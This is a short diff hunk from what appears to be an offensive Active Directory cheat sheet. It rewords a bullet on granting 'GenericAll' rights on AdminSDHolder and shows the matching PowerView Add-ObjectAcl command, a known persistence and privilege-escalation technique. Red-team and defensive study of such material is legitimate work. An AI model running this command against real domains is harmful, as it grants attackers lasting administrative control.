@@ -272,7 +272,7 @@ https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invok
 #Rights Abuse - ACLs
 ####AdminSDHolder 
 
-•  Add FullControl permissions for a user to AdminSDHolder
+•  Add FullControl permissions ("GenericAll" rights) for an arbitrary user to AdminSDHolder 
 
 ```Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Josh -Rights All -Verbose``` - PowerView
 
